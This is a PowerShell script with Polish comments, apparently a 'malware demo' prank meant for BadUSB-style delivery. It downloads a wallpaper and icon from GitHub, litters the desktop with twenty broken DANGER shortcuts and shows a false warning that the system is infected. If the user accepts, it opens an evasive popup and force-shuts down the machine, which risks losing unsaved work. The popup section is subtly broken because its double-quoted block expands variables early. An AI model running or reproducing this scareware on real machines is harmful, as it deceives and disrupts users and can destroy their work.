Add-Type -AssemblyName PresentationFramework

$wallpaperUrl = "https://raw.githubusercontent.com/TWOJ_NICK/flipper-malware-demo/main/wallpaper.jpg"
$iconUrl = "https://raw.githubusercontent.com/TWOJ_NICK/flipper-malware-demo/main/icon.ico"
$wallpaperPath = "$env:TEMP\wallpaper.jpg"
$iconPath = "$env:TEMP\icon.ico"
$pulpit = [Environment]::GetFolderPath("Desktop")

# Pobierz pliki
(New-Object System.Net.WebClient).DownloadFile($wallpaperUrl, $wallpaperPath)
(New-Object System.Net.WebClient).DownloadFile($iconUrl, $iconPath)

# Ustaw tapetę
$code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type $code
[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)

# Tworzenie 20 plików TXT z losowym tekstem
for ($i = 1; $i -le 20; $i++) {
    $filePath = "$pulpit\DANGER_$i.txt"
    $randomText = -join ((33..126) | Get-Random -Count 500 | ForEach-Object {[char]$_})
    Set-Content $filePath $randomText

    # Utwórz skrót z ikoną
    $shortcut = "$pulpit\DANGER_$i.lnk"
    $wshell = New-Object -ComObject WScript.Shell
    $s = $wshell.CreateShortcut($shortcut)
    $s.TargetPath = $filePath
    $s.IconLocation = $iconPath
    $s.Save()
    Remove-Item $filePath
}

# Komunikat z wyborem
$result = [System.Windows.MessageBox]::Show("To nie jest żart. Ten system został zainfekowany przez demo malware.\n\nKontynuować?", "OSTRZEŻENIE", "YesNo", "Warning")

if ($result -eq "Yes") {
    # Uruchom popup w nowym oknie
    $popupCode = @"
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.Text = 'Złap mnie!'
$form.Size = '300,150'
$form.TopMost = $true
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 200
$timer.Add_Tick({
    $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 800), (Get-Random -Minimum 0 -Maximum 500))
})
$timer.Start()
$form.ShowDialog()
"@
    powershell -WindowStyle Hidden -Command $popupCode

    Start-Sleep -Seconds 5
    Stop-Computer -Force
}
